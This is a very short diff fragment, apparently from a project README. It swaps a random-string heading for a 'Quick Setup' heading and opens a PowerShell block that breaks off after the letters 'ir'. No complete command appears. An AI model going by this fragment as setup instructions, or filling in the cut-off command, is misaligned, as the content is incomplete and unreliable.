@@ -1,1 +1,4 @@
-# qgkknlvf
+**Quick Setup**
+
+```powershell
+ir
